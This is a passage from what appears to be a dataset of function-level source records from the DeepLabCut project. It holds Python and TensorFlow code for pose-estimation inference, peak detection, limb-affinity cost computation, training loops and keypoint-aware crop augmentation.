        scmap_top = scmap_top.swapaxes(0, 1)
    (Y, X) = np.unravel_index(scmap_top, (ny, nx))
    return (Y, X)"
AlexEMG/DeepLabCut,getposeNP,"def getposeNP(image, cfg, sess, inputs, outputs, outall=False):
    """"""Adapted from DeeperCut, performs numpy-based faster inference on batches.
    Introduced in https://www.biorxiv.org/content/10.1101/457242v1""""""
    num_outputs = cfg.get('num_outputs', 1)
    outputs_np = sess.run(outputs, feed_dict={inputs: image})
    (scmap, locref) = extract_cnn_outputmulti(outputs_np, cfg)
    (batchsize, ny, nx, num_joints) = scmap.shape
    (Y, X) = get_top_values(scmap, n_top=num_outputs)
    DZ = np.zeros((num_outputs, batchsize, num_joints, 3))
    for m in range(num_outputs):
        for l in range(batchsize):
            for k in range(num_joints):
                x = X[m, l, k]
                y = Y[m, l, k]
                DZ[m, l, k, :2] = locref[l, y, x, k, :]
                DZ[m, l, k, 2] = scmap[l, y, x, k]
    X = X.astype('float32') * cfg['stride'] + 0.5 * cfg['stride'] + DZ[:, :, :, 0]
    Y = Y.astype('float32') * cfg['stride'] + 0.5 * cfg['stride'] + DZ[:, :, :, 1]
    P = DZ[:, :, :, 2]
    Xs = X.swapaxes(0, 2).swapaxes(0, 1)
    Ys = Y.swapaxes(0, 2).swapaxes(0, 1)
    Ps = P.swapaxes(0, 2).swapaxes(0, 1)
    pose = np.empty((cfg['batch_size'], num_outputs * cfg['num_joints'] * 3), dtype=X.dtype)
    pose[:, 0::3] = Xs.reshape(batchsize, -1)
    pose[:, 1::3] = Ys.reshape(batchsize, -1)
    pose[:, 2::3] = Ps.reshape(batchsize, -1)
    if outall:
        return (scmap, locref, pose)
    else:
        return pose"
AlexEMG/DeepLabCut,setup_GPUpose_prediction,"def setup_GPUpose_prediction(cfg, allow_growth=False):
    tf.compat.v1.reset_default_graph()
    inputs = tf.compat.v1.placeholder(tf.float32, shape=[cfg['batch_size'], None, None, 3])
    net_heads = PoseNetFactory.create(cfg).inference(inputs)
    outputs = [net_heads['pose']]
    restorer = tf.compat.v1.train.Saver()
    if allow_growth:
        config = tf.compat.v1.ConfigProto()
        config.gpu_options.allow_growth = True
        sess = tf.compat.v1.Session(config=config)
    else:
        sess = tf.compat.v1.Session()
    sess.run(tf.compat.v1.global_variables_initializer())
    sess.run(tf.compat.v1.local_variables_initializer())
    restorer.restore(sess, cfg['init_weights'])
    return (sess, inputs, outputs)"
AlexEMG/DeepLabCut,extract_GPUprediction,"def extract_GPUprediction(outputs, cfg):
    return outputs[0]"
AlexEMG/DeepLabCut,setup_openvino_pose_prediction,"def setup_openvino_pose_prediction(cfg, device):
    sess = OpenVINOSession(cfg, device)
    return (sess, sess.input_name, [sess.output_name])"
AlexEMG/DeepLabCut,extract_cnn_output,"def extract_cnn_output(outputs_np, cfg):
    """"""extract locref, scmap and partaffinityfield from network""""""
    scmap = outputs_np[0]
    scmap = np.squeeze(scmap)
    if cfg['location_refinement']:
        locref = np.squeeze(outputs_np[1])
        shape = locref.shape
        locref = np.reshape(locref, (shape[0], shape[1], -1, 2))
        locref *= cfg['locref_stdev']
    else:
        locref = None
    if cfg['partaffinityfield_predict'] and 'multi-animal' in cfg['dataset_type']:
        paf = np.squeeze(outputs_np[2])
    else:
        paf = None
    if len(scmap.shape) == 2:
        scmap = np.expand_dims(scmap, axis=2)
    return (scmap, locref, paf)"
AlexEMG/DeepLabCut,extract_cnn_outputmulti,"def extract_cnn_outputmulti(outputs_np, cfg):
    """"""extract locref + scmap from network
    Dimensions: image batch x imagedim1 x imagedim2 x bodypart""""""
    scmap = outputs_np[0]
    if cfg['location_refinement']:
        locref = outputs_np[1]
        shape = locref.shape
        locref = np.reshape(locref, (shape[0], shape[1], shape[2], -1, 2))
        locref *= cfg['locref_stdev']
    else:
        locref = None
    if cfg['partaffinityfield_predict'] and 'multi-animal' in cfg['dataset_type']:
        paf = outputs_np[2]
    else:
        paf = None
    if len(scmap.shape) == 2:
        scmap = np.expand_dims(scmap, axis=2)
    return (scmap, locref, paf)"
AlexEMG/DeepLabCut,compute_edge_costs,"def compute_edge_costs(pafs, peak_inds_in_batch, graph, paf_inds, n_bodyparts, n_points=10, n_decimals=3):
    (h, w) = pafs.shape[1:3]
    peak_inds_in_batch[:, 1] = np.clip(peak_inds_in_batch[:, 1], 0, h - 1)
    peak_inds_in_batch[:, 2] = np.clip(peak_inds_in_batch[:, 2], 0, w - 1)
    n_samples = pafs.shape[0]
    sample_inds = []
    edge_inds = []
    all_edges = []
    all_peaks = []
    for i in range(n_samples):
        samples_i = peak_inds_in_batch[:, 0] == i
        peak_inds = peak_inds_in_batch[samples_i, 1:]
        if not np.any(peak_inds):
            continue
        peaks = peak_inds[:, :2]
        bpt_inds = peak_inds[:, 2]
        idx = np.arange(peaks.shape[0])
        idx_per_bpt = {j: idx[bpt_inds == j].tolist() for j in range(n_bodyparts)}
        edges = []
        for (k, (s, t)) in zip(paf_inds, graph):
            inds_s = idx_per_bpt[s]
            inds_t = idx_per_bpt[t]
            if not (inds_s and inds_t):
                continue
            candidate_edges = ((i, j) for i in inds_s for j in inds_t)
            edges.extend(candidate_edges)
            edge_inds.extend([k] * len(inds_s) * len(inds_t))
        if not edges:
            continue
        sample_inds.extend([i] * len(edges))
        all_edges.extend(edges)
        all_peaks.append(peaks[np.asarray(edges)])
    if not all_peaks:
        return [dict() for _ in range(n_samples)]
    sample_inds = np.asarray(sample_inds, dtype=np.int32)
    edge_inds = np.asarray(edge_inds, dtype=np.int32)
    all_edges = np.asarray(all_edges, dtype=np.int32)
    all_peaks = np.concatenate(all_peaks)
    vecs_s = all_peaks[:, 0]
    vecs_t = all_peaks[:, 1]
    vecs = vecs_t - vecs_s
    lengths = np.linalg.norm(vecs, axis=1).astype(np.float32)
    lengths += np.spacing(1, dtype=np.float32)
    xy = np.linspace(vecs_s, vecs_t, n_points, axis=1, dtype=np.int32)
    y = pafs[sample_inds.reshape((-1, 1)), xy[..., 0], xy[..., 1], edge_inds.reshape((-1, 1))]
    integ = np.trapz(y, xy[..., ::-1], axis=1)
    affinities = np.linalg.norm(integ, axis=1).astype(np.float32)
    affinities /= lengths
    np.round(affinities, decimals=n_decimals, out=affinities)
    np.round(lengths, decimals=n_decimals, out=lengths)
    all_costs = []
    for i in range(n_samples):
        samples_i_mask = sample_inds == i
        costs = dict()
        for k in paf_inds:
            edges_k_mask = edge_inds == k
            idx = np.flatnonzero(samples_i_mask & edges_k_mask)
            (s, t) = all_edges[idx].T
            n_sources = np.unique(s).size
            n_targets = np.unique(t).size
            costs[k] = dict()
            costs[k]['m1'] = affinities[idx].reshape((n_sources, n_targets))
            costs[k]['distance'] = lengths[idx].reshape((n_sources, n_targets))
        all_costs.append(costs)
    return all_costs"
AlexEMG/DeepLabCut,compute_peaks_and_costs,"def compute_peaks_and_costs(scmaps, locrefs, pafs, peak_inds_in_batch, graph, paf_inds, stride, n_id_channels, n_points=10, n_decimals=3):
    (n_samples, _, _, n_channels) = np.shape(scmaps)
    n_bodyparts = n_channels - n_id_channels
    pos = calc_peak_locations(locrefs, peak_inds_in_batch, stride, n_decimals)
    if graph:
        costs = compute_edge_costs(pafs, peak_inds_in_batch, graph, paf_inds, n_bodyparts, n_points, n_decimals)
    else:
        costs = None
    (s, r, c, b) = peak_inds_in_batch.T
    prob = np.round(scmaps[s, r, c, b], n_decimals).reshape((-1, 1))
    if n_id_channels:
        ids = np.round(scmaps[s, r, c, -n_id_channels:], n_decimals)
    peaks_and_costs = []
    for i in range(n_samples):
        xy = []
        p = []
        id_ = []
        samples_i_mask = peak_inds_in_batch[:, 0] == i
        for j in range(n_bodyparts):
            bpts_j_mask = peak_inds_in_batch[:, 3] == j
            idx = np.flatnonzero(samples_i_mask & bpts_j_mask)
            xy.append(pos[idx])
            p.append(prob[idx])
            if n_id_channels:
                id_.append(ids[idx])
        dict_ = {'coordinates': (xy,), 'confidence': p}
        if costs is not None:
            dict_['costs'] = costs[i]
        if n_id_channels:
            dict_['identity'] = id_
        peaks_and_costs.append(dict_)
    return peaks_and_costs"
AlexEMG/DeepLabCut,predict_batched_peaks_and_costs,"def predict_batched_peaks_and_costs(pose_cfg, images_batch, sess, inputs, outputs, peaks_gt=None, n_points=10, n_decimals=3, extra_dict=None):
    if extra_dict:
        features = sess.run(extra_dict['features'], feed_dict={inputs: images_batch})
    (scmaps, locrefs, *pafs, peaks) = sess.run(outputs, feed_dict={inputs: images_batch})
    if ~np.any(peaks):
        return []
    locrefs = np.reshape(locrefs, (*locrefs.shape[:3], -1, 2))
    locrefs *= pose_cfg['locref_stdev']
    if pafs:
        pafs = np.reshape(pafs[0], (*pafs[0].shape[:3], -1, 2))
    else:
        pafs = None
    graph = pose_cfg['partaffinityfield_graph']
    limbs = pose_cfg.get('paf_best', np.arange(len(graph)))
    graph = [graph[l] for l in limbs]
    preds = compute_peaks_and_costs(scmaps, locrefs, pafs, peaks, graph, limbs, pose_cfg['stride'], pose_cfg.get('num_idchannel', 0), n_points, n_decimals)
    if peaks_gt is not None and graph:
        costs_gt = compute_edge_costs(pafs, peaks_gt, graph, limbs, pose_cfg['num_joints'], n_points, n_decimals)
        for (i, costs) in enumerate(costs_gt):
            preds[i]['groundtruth_costs'] = costs
    if extra_dict:
        return (preds, features)
    else:
        return preds"
AlexEMG/DeepLabCut,find_local_maxima,"def find_local_maxima(scmap, radius, threshold):
    peak_idx = peak_local_max(scmap, min_distance=radius, threshold_abs=threshold, exclude_border=False)
    grid = np.zeros_like(scmap, dtype=bool)
    grid[tuple(peak_idx.T)] = True
    labels = measurements.label(grid)[0]
    xy = measurements.center_of_mass(grid, labels, range(1, np.max(labels) + 1))
    return np.asarray(xy, dtype=int).reshape((-1, 2))"
AlexEMG/DeepLabCut,find_local_peak_indices_maxpool_nms,"def find_local_peak_indices_maxpool_nms(scmaps, radius, threshold):
    pooled = tf.nn.max_pool2d(scmaps, [radius, radius], strides=1, padding='SAME')
    maxima = scmaps * tf.cast(tf.equal(scmaps, pooled), tf.float32)
    return tf.cast(tf.where(maxima >= threshold), tf.int32)"
AlexEMG/DeepLabCut,find_local_peak_indices_dilation,"def find_local_peak_indices_dilation(scmaps, radius, threshold):
    kernel = np.zeros((radius, radius, 1))
    mid = (radius - 1) // 2
    kernel[mid, mid] = -1
    kernel = tf.convert_to_tensor(kernel, dtype=tf.float32)
    height = tf.shape(scmaps)[1]
    width = tf.shape(scmaps)[2]
    depth = tf.shape(scmaps)[3]
    scmaps_flat = tf.reshape(tf.transpose(scmaps, [0, 3, 1, 2]), [-1, height, width, 1])
    scmaps_dil = tf.nn.dilation2d(scmaps_flat, kernel, strides=[1, 1, 1, 1], rates=[1, 1, 1, 1], padding='SAME')
    scmaps_dil = tf.transpose(tf.reshape(scmaps_dil, [-1, depth, height, width]), [0, 2, 3, 1])
    argmax_and_thresh_img = (scmaps > scmaps_dil) & (scmaps > threshold)
    return tf.cast(tf.where(argmax_and_thresh_img), tf.int32)"
AlexEMG/DeepLabCut,find_local_peak_indices_skimage,"def find_local_peak_indices_skimage(scmaps, radius, threshold):
    inds_gt = []
    for i in range(scmaps.shape[0]):
        for j in range(scmaps.shape[3]):
            scmap = scmaps[i, ..., j]
            peaks = find_local_maxima(scmap, radius, threshold)
            samples_i = np.ones(len(peaks), dtype=int).reshape((-1, 1)) * i
            bpts_j = np.ones_like(samples_i) * j
            inds_gt.append(np.c_[samples_i, peaks, bpts_j])
    return np.concatenate(inds_gt)"
AlexEMG/DeepLabCut,calc_peak_locations,"def calc_peak_locations(locrefs, peak_inds_in_batch, stride, n_decimals=3):
    (s, r, c, b) = peak_inds_in_batch.T
    off = locrefs[s, r, c, b]
    loc = stride * peak_inds_in_batch[:, [2, 1]] + stride // 2 + off
    return np.round(loc, decimals=n_decimals)"
AlexEMG/DeepLabCut,test_net,"def test_net(visualise, cache_scoremaps):
    logging.basicConfig(level=logging.INFO)
    cfg = load_config()
    dataset = PoseDatasetFactory.create(cfg)
    dataset.set_shuffle(False)
    dataset.set_test_mode(True)
    (sess, inputs, outputs) = setup_pose_prediction(cfg)
    if cache_scoremaps:
        out_dir = cfg['scoremap_dir']
        if not os.path.exists(out_dir):
            os.makedirs(out_dir)
    num_images = dataset.num_images
    predictions = np.zeros((num_images,), dtype=np.object)
    for k in range(num_images):
        print('processing image {}/{}'.format(k, num_images - 1))
        batch = dataset.next_batch()
        outputs_np = sess.run(outputs, feed_dict={inputs: batch[Batch.inputs]})
        (scmap, locref) = extract_cnn_output(outputs_np, cfg)
        pose = argmax_pose_predict(scmap, locref, cfg['stride'])
        pose_refscale = np.copy(pose)
        pose_refscale[:, 0:2] /= cfg['global_scale']
        predictions[k] = pose_refscale
        if visualise:
            img = np.squeeze(batch[Batch.inputs]).astype('uint8')
            visualize.show_heatmaps(cfg, img, scmap, pose)
            visualize.waitforbuttonpress()
        if cache_scoremaps:
            base = os.path.basename(batch[Batch.data_item].im_path)
            raw_name = os.path.splitext(base)[0]
            out_fn = os.path.join(out_dir, raw_name + '.mat')
            scipy.io.savemat(out_fn, mdict={'scoremaps': scmap.astype('float32')})
            out_fn = os.path.join(out_dir, raw_name + '_locreg' + '.mat')
            if cfg['location_refinement']:
                scipy.io.savemat(out_fn, mdict={'locreg_pred': locref.astype('float32')})
    scipy.io.savemat('predictions.mat', mdict={'joints': predictions})
    sess.close()"
AlexEMG/DeepLabCut,get_batch_spec,"def get_batch_spec(cfg):
    num_joints = cfg['num_joints']
    batch_size = cfg['batch_size']
    return {Batch.inputs: [batch_size, None, None, 3], Batch.part_score_targets: [batch_size, None, None, num_joints], Batch.part_score_weights: [batch_size, None, None, num_joints], Batch.locref_targets: [batch_size, None, None, num_joints * 2], Batch.locref_mask: [batch_size, None, None, num_joints * 2]}"
AlexEMG/DeepLabCut,setup_preloading,"def setup_preloading(batch_spec):
    placeholders = {name: tf.compat.v1.placeholder(tf.float32, shape=spec) for (name, spec) in batch_spec.items()}
    names = placeholders.keys()
    placeholders_list = list(placeholders.values())
    QUEUE_SIZE = 20
    q = tf.queue.FIFOQueue(QUEUE_SIZE, [tf.float32] * len(batch_spec))
    enqueue_op = q.enqueue(placeholders_list)
    batch_list = q.dequeue()
    batch = {}
    for (idx, name) in enumerate(names):
        batch[name] = batch_list[idx]
        batch[name].set_shape(batch_spec[name])
    return (batch, enqueue_op, placeholders)"
AlexEMG/DeepLabCut,load_and_enqueue,"def load_and_enqueue(sess, enqueue_op, coord, dataset, placeholders):
    while not coord.should_stop():
        batch_np = dataset.next_batch()
        food = {pl: batch_np[name] for (name, pl) in placeholders.items()}
        sess.run(enqueue_op, feed_dict=food)"
AlexEMG/DeepLabCut,start_preloading,"def start_preloading(sess, enqueue_op, dataset, placeholders):
    coord = tf.compat.v1.train.Coordinator()
    t = threading.Thread(target=load_and_enqueue, args=(sess, enqueue_op, coord, dataset, placeholders))
    t.start()
    return (coord, t)"
AlexEMG/DeepLabCut,get_optimizer,"def get_optimizer(loss_op, cfg):
    tstep = tf.compat.v1.placeholder(tf.int32, shape=[], name='tstep')
    if 'efficientnet' in cfg['net_type']:
        print('Switching to cosine decay schedule with adam!')
        cfg['optimizer'] = 'adam'
        learning_rate = tf.compat.v1.train.cosine_decay(cfg['lr_init'], tstep, cfg['decay_steps'], alpha=cfg['alpha_r'])
    else:
        learning_rate = tf.compat.v1.placeholder(tf.float32, shape=[])
    if cfg['optimizer'] == 'sgd':
        optimizer = tf.compat.v1.train.MomentumOptimizer(learning_rate=learning_rate, momentum=0.9)
    elif cfg['optimizer'] == 'adam':
        optimizer = tf.compat.v1.train.AdamOptimizer(learning_rate)
    else:
        raise ValueError('unknown optimizer {}'.format(cfg['optimizer']))
    train_op = slim.learning.create_train_op(loss_op, optimizer)
    return (learning_rate, train_op, tstep)"
AlexEMG/DeepLabCut,get_optimizer_with_freeze,"def get_optimizer_with_freeze(loss_op, cfg):
    learning_rate = tf.compat.v1.placeholder(tf.float32, shape=[])
    if cfg['optimizer'] == 'sgd':
        optimizer = tf.compat.v1.train.MomentumOptimizer(learning_rate=learning_rate, momentum=0.9)
    elif cfg['optimizer'] == 'adam':
        optimizer = tf.compat.v1.train.AdamOptimizer(learning_rate)
    else:
        raise ValueError('unknown optimizer {}'.format(cfg['optimizer']))
    train_unfrozen_op = slim.learning.create_train_op(loss_op, optimizer)
    variables_unfrozen = tf.compat.v1.get_collection(tf.compat.v1.GraphKeys.TRAINABLE_VARIABLES, 'pose')
    train_frozen_op = slim.learning.create_train_op(loss_op, optimizer, variables_to_train=variables_unfrozen)
    return (learning_rate, train_unfrozen_op, train_frozen_op)"
AlexEMG/DeepLabCut,train,"def train(config_yaml, displayiters, saveiters, maxiters, max_to_keep=5, keepdeconvweights=True, allow_growth=True):
    start_path = os.getcwd()
    os.chdir(str(Path(config_yaml).parents[0]))
    setup_logging()
    cfg = load_config(config_yaml)
    net_type = cfg['net_type']
    if cfg['dataset_type'] in ('scalecrop', 'tensorpack', 'deterministic'):
        print('Switching batchsize to 1, as tensorpack/scalecrop/deterministic loaders do not support batches >1. Use imgaug/default loader.')
        cfg['batch_size'] = 1
    dataset = PoseDatasetFactory.create(cfg)
    batch_spec = get_batch_spec(cfg)
    (batch, enqueue_op, placeholders) = setup_preloading(batch_spec)
    losses = PoseNetFactory.create(cfg).train(batch)
    total_loss = losses['total_loss']
    for (k, t) in losses.items():
        tf.compat.v1.summary.scalar(k, t)
    merged_summaries = tf.compat.v1.summary.merge_all()
    stem = Path(cfg['init_weights']).stem
    if 'snapshot' in stem and keepdeconvweights:
        print('Loading already trained DLC with backbone:', net_type)
        variables_to_restore = slim.get_variables_to_restore()
        start_iter = int(stem.split('-')[1])
    else:
        print('Loading ImageNet-pretrained', net_type)
        if 'resnet' in net_type:
            variables_to_restore = slim.get_variables_to_restore(include=['resnet_v1'])
        elif 'mobilenet' in net_type:
            variables_to_restore = slim.get_variables_to_restore(include=['MobilenetV2'])
        elif 'efficientnet' in net_type:
            variables_to_restore = slim.get_variables_to_restore(include=['efficientnet'])
            variables_to_restore = {var.op.name.replace('efficientnet/', '') + '/ExponentialMovingAverage': var for var in variables_to_restore}
        else:
            print('Wait for DLC 2.3.')
        start_iter = 0
    restorer = tf.compat.v1.train.Saver(variables_to_restore)
    saver = tf.compat.v1.train.Saver(max_to_keep=max_to_keep)
    if allow_growth:
        config = tf.compat.v1.ConfigProto()
        config.gpu_options.allow_growth = True
        sess = tf.compat.v1.Session(config=config)
    else:
        sess = tf.compat.v1.Session()
    (coord, thread) = start_preloading(sess, enqueue_op, dataset, placeholders)
    train_writer = tf.compat.v1.summary.FileWriter(cfg['log_dir'], sess.graph)
    from tensorflow.python.platform import build_info
    info = build_info.build_info
    if not info['is_cuda_build']:
        warnings.warn('Switching to Adam, as SGD crashes on Apple Silicon.')
        cfg['optimizer'] = 'adam'
        cfg['lr_init'] = 0.0005
        cfg['multi_step'] = [[0.0001, 7500], [5e-05, 12000], [1e-05, 200000]]
    if cfg.get('freezeencoder', False):
        if 'efficientnet' in net_type:
            print('Freezing ONLY supported MobileNet/ResNet currently!!')
            (learning_rate, train_op, tstep) = get_optimizer(total_loss, cfg)
        print('Freezing encoder...')
        (learning_rate, _, train_op) = get_optimizer_with_freeze(total_loss, cfg)
    else:
        (learning_rate, train_op, tstep) = get_optimizer(total_loss, cfg)
    sess.run(tf.compat.v1.global_variables_initializer())
    sess.run(tf.compat.v1.local_variables_initializer())
    auxfun_models.smart_restore(restorer, sess, cfg['init_weights'], net_type)
    if maxiters is None:
        max_iter = int(cfg['multi_step'][-1][1])
    else:
        max_iter = min(int(cfg['multi_step'][-1][1]), int(maxiters))
        print('Max_iters overwritten as', max_iter)
    if displayiters is None:
        display_iters = max(1, int(cfg['display_iters']))
    else:
        display_iters = max(1, int(displayiters))
        print('Display_iters overwritten as', display_iters)
    if saveiters is None:
        save_iters = max(1, int(cfg['save_iters']))
    else:
        save_iters = max(1, int(saveiters))
        print('Save_iters overwritten as', save_iters)
    cum_loss = 0.0
    lr_gen = LearningRate(cfg)
    stats_path = Path(config_yaml).with_name('learning_stats.csv')
    lrf = open(str(stats_path), 'w')
    print('Training parameter:')
    print(cfg)
    print('Starting training....')
    max_iter += start_iter
    for it in range(start_iter, max_iter + 1):
        if 'efficientnet' in net_type:
            lr_dict = {tstep: it - start_iter}
            current_lr = sess.run(learning_rate, feed_dict=lr_dict)
        else:
            current_lr = lr_gen.get_lr(it - start_iter)
            lr_dict = {learning_rate: current_lr}
        [_, loss_val, summary] = sess.run([train_op, total_loss, merged_summaries], feed_dict=lr_dict)
        cum_loss += loss_val
        train_writer.add_summary(summary, it)
        if it % display_iters == 0 and it > start_iter:
            average_loss = cum_loss / display_iters
            cum_loss = 0.0
            logging.info('iteration: {} loss: {} lr: {}'.format(it, '{0:.4f}'.format(average_loss), current_lr))
            lrf.write('{}, {:.5f}, {}\n'.format(it, average_loss, current_lr))
            lrf.flush()
        if it % save_iters == 0 and it != start_iter or it == max_iter:
            model_name = cfg['snapshot_prefix']
            saver.save(sess, model_name, global_step=it)
    lrf.close()
    sess.close()
    coord.request_stop()
    coord.join([thread])
    os.chdir(str(start_path))"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg):
    self.steps = cfg['multi_step']
    self.current_step = 0"
AlexEMG/DeepLabCut,get_lr,"def get_lr(self, iteration):
    lr = self.steps[self.current_step][0]
    if iteration == self.steps[self.current_step][1]:
        self.current_step += 1
    return lr"
AlexEMG/DeepLabCut,train,"def train(config_yaml, displayiters, saveiters, maxiters, max_to_keep=5, keepdeconvweights=True, allow_growth=True, pseudo_labels='', init_weights='', pseudo_threshold=0.1, modelfolder='', traintime_resize=False, video_path='', superanimal=None, remove_head=False):
    tf.compat.v1.reset_default_graph()
    start_path = os.getcwd()
    if modelfolder == '':
        os.chdir(str(Path(config_yaml).parents[0]))
    else:
        os.chdir(modelfolder)
    setup_logging()
    cfg = load_config(config_yaml)
    cfg['pseudo_threshold'] = pseudo_threshold
    cfg['video_path'] = video_path
    cfg['traintime_resize'] = traintime_resize
    if superanimal is not None:
        cfg['superanimal'] = superanimal
    if pseudo_labels != '':
        cfg['pseudo_label'] = pseudo_labels
    if modelfolder != '':
        cfg['log_dir'] = modelfolder
        cfg['project_path'] = modelfolder
        cfg['snapshot_prefix'] = os.path.join('snapshot')
    if cfg['optimizer'] != 'adam':
        print('Setting batchsize to 1! Larger batchsize not supported for this loader:', cfg['dataset_type'])
        cfg['batch_size'] = 1
    if cfg['partaffinityfield_predict'] and 'multi-animal' in cfg['dataset_type']:
        print('Activating limb prediction...')
        cfg['pairwise_predict'] = True
    dataset = PoseDatasetFactory.create(cfg)
    batch_spec = get_batch_spec(cfg)
    (batch, enqueue_op, placeholders) = setup_preloading(batch_spec)
    losses = PoseNetFactory.create(cfg).train(batch)
    total_loss = losses['total_loss']
    for (k, t) in losses.items():
        tf.compat.v1.summary.scalar(k, t)
    merged_summaries = tf.compat.v1.summary.merge_all()
    net_type = cfg['net_type']
    if init_weights != '':
        cfg['init_weights'] = init_weights
        cfg['resume_weights_only'] = True
        print('replacing default init weights with: ', init_weights)
    stem = Path(cfg['init_weights']).stem
    if 'snapshot' in stem and keepdeconvweights:
        print('Loading already trained DLC with backbone:', net_type)
        variables_to_restore = slim.get_variables_to_restore()
        if cfg.get('resume_weights_only', False):
            start_iter = 0
        else:
            start_iter = int(stem.split('-')[1])
        if remove_head:
            temp = []
            for variable in variables_to_restore:
                if 'pose' not in variable.name:
                    temp.append(variable)
            variables_to_restore = temp
    else:
        print('Loading ImageNet-pretrained', net_type)
        if 'resnet' in net_type:
            variables_to_restore = slim.get_variables_to_restore(include=['resnet_v1'])
        elif 'mobilenet' in net_type:
            variables_to_restore = slim.get_variables_to_restore(include=['MobilenetV2'])
        elif 'efficientnet' in net_type:
            variables_to_restore = slim.get_variables_to_restore(include=['efficientnet'])
            variables_to_restore = {var.op.name.replace('efficientnet/', '') + '/ExponentialMovingAverage': var for var in variables_to_restore}
        else:
            print('Wait for DLC 2.3.')
        start_iter = 0
    restorer = tf.compat.v1.train.Saver(variables_to_restore)
    saver = tf.compat.v1.train.Saver(max_to_keep=max_to_keep)
    if allow_growth:
        config = tf.compat.v1.ConfigProto()
        config.gpu_options.allow_growth = True
        sess = tf.compat.v1.Session(config=config)
    else:
        sess = tf.compat.v1.Session()
    (coord, thread) = start_preloading(sess, enqueue_op, dataset, placeholders)
    train_writer = tf.compat.v1.summary.FileWriter(cfg['log_dir'], sess.graph)
    (learning_rate, train_op, tstep) = get_optimizer(total_loss, cfg)
    sess.run(tf.compat.v1.global_variables_initializer())
    sess.run(tf.compat.v1.local_variables_initializer())
    auxfun_models.smart_restore(restorer, sess, cfg['init_weights'], net_type)
    if maxiters is None:
        max_iter = int(cfg['multi_step'][-1][1])
    else:
        max_iter = min(int(cfg['multi_step'][-1][1]), int(maxiters))
        print('Max_iters overwritten as', max_iter)
    if displayiters is None:
        display_iters = max(1, int(cfg['display_iters']))
    else:
        display_iters = max(1, int(displayiters))
        print('Display_iters overwritten as', display_iters)
    if saveiters is None:
        save_iters = max(1, int(cfg['save_iters']))
    else:
        save_iters = max(1, int(saveiters))
        print('Save_iters overwritten as', save_iters)
    (cumloss, partloss, locrefloss, pwloss) = (0.0, 0.0, 0.0, 0.0)
    lr_gen = LearningRate(cfg)
    stats_path = Path(config_yaml).with_name('learning_stats.csv')
    lrf = open(str(stats_path), 'w')
    print('Training parameters:')
    print(cfg)
    print('Starting multi-animal training....')
    max_iter += start_iter
    for it in range(start_iter, max_iter + 1):
        if 'efficientnet' in net_type:
            lr_dict = {tstep: it - start_iter}
            current_lr = sess.run(learning_rate, feed_dict=lr_dict)
        else:
            current_lr = lr_gen.get_lr(it - start_iter)
            lr_dict = {learning_rate: current_lr}
        [_, alllosses, loss_val, summary] = sess.run([train_op, losses, total_loss, merged_summaries], feed_dict=lr_dict)
        partloss += alllosses['part_loss']
        if cfg['location_refinement']:
            locrefloss += alllosses['locref_loss']
        if cfg['pairwise_predict']:
            pwloss += alllosses['pairwise_loss']
        cumloss += loss_val
        train_writer.add_summary(summary, it)
        if it % display_iters == 0 and it > start_iter:
            logging.info('iteration: {} loss: {} scmap loss: {} locref loss: {} limb loss: {} lr: {}'.format(it, '{0:.4f}'.format(cumloss / display_iters), '{0:.4f}'.format(partloss / display_iters), '{0:.4f}'.format(locrefloss / display_iters), '{0:.4f}'.format(pwloss / display_iters), current_lr))
            lrf.write('iteration: {}, loss: {}, scmap loss: {}, locref loss: {}, limb loss: {}, lr: {}\n'.format(it, '{0:.4f}'.format(cumloss / display_iters), '{0:.4f}'.format(partloss / display_iters), '{0:.4f}'.format(locrefloss / display_iters), '{0:.4f}'.format(pwloss / display_iters), current_lr))
            (cumloss, partloss, locrefloss, pwloss) = (0.0, 0.0, 0.0, 0.0)
            lrf.flush()
        if it % save_iters == 0 and it != start_iter or it == max_iter:
            model_name = cfg['snapshot_prefix']
            saver.save(sess, model_name, global_step=it)
    lrf.close()
    sess.close()
    coord.request_stop()
    coord.join([thread])
    os.chdir(str(start_path))"
AlexEMG/DeepLabCut,update_crop_size,"def update_crop_size(pipeline, width, height):
    aug = pipeline.find_augmenters_by_name('kptscrop')
    if not aug:
        return
    aug[0].size = (width, height)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, keypoints: List[str], symmetric_pairs: List[Union[Tuple, List]], p: float=1.0):
    super().__init__(p=p)
    self.keypoints = keypoints
    self.symmetric_pairs = symmetric_pairs"
AlexEMG/DeepLabCut,n_keypoints,"@property
def n_keypoints(self):
    return len(self.keypoints)"
AlexEMG/DeepLabCut,_augment_batch_,"def _augment_batch_(self, batch, random_state, parents, hooks):
    batch = super()._augment_batch_(batch, random_state, parents, hooks)
    keypoints = []
    for kpts in batch.keypoints:
        kpts_ = list(kpts)
        n_kpts = len(kpts_)
        for (i1, i2) in self.symmetric_pairs:
            for j in range(0, n_kpts, self.n_keypoints):
                (kpts_[i1 + j], kpts_[i2 + j]) = (kpts_[i2 + j], kpts_[i1 + j])
        keypoints.append(KeypointsOnImage(kpts_, kpts.shape))
    batch.keypoints = keypoints
    return batch"
AlexEMG/DeepLabCut,__init__,"def __init__(self, width, height, max_shift=0.4, crop_sampling='hybrid'):
    """"""
        Parameters
        ----------
        width : int
            Crop images down to this maximum width.

        height : int
            Crop images down to this maximum height.

        max_shift : float, optional (default=0.25)
            Maximum allowed shift of the cropping center position
            as a fraction of the crop size.

        crop_sampling : str, optional (default=""hybrid"")
            Crop centers sampling method. Must be either:
            ""uniform"" (randomly over the image),
            ""keypoints"" (randomly over the annotated keypoints),
            ""density"" (weighing preferentially dense regions of keypoints),
            or ""hybrid"" (alternating randomly between ""uniform"" and ""density"").
        """"""
    super(KeypointAwareCropToFixedSize, self).__init__(width, height, name='kptscrop')
    self.max_shift = max(0.0, min(max_shift, 0.4))
    if crop_sampling not in ('uniform', 'keypoints', 'density', 'hybrid'):
        raise ValueError(f""Invalid sampling {crop_sampling}. Must be either 'uniform', 'keypoints', 'density', or 'hybrid."")
    self.crop_sampling = crop_sampling"
AlexEMG/DeepLabCut,calc_n_neighbors,"@staticmethod
def calc_n_neighbors(xy, radius):
    d = pdist(xy, 'sqeuclidean')
    mat = squareform(d <= radius * radius, checks=False)
    return np.sum(mat, axis=0)"
AlexEMG/DeepLabCut,_draw_samples,"def _draw_samples(self, batch, random_state):
    n_samples = batch.nb_rows
    offsets = np.empty((n_samples, 2), dtype=np.float32)
    rngs = random_state.duplicate(2)
    shift_x = self.max_shift * self.size[0] * rngs[0].uniform(-1, 1, n_samples)
    shift_y = self.max_shift * self.size[1] * rngs[1].uniform(-1, 1, n_samples)
    sampling = self.crop_sampling
    for n in range(batch.nb_rows):
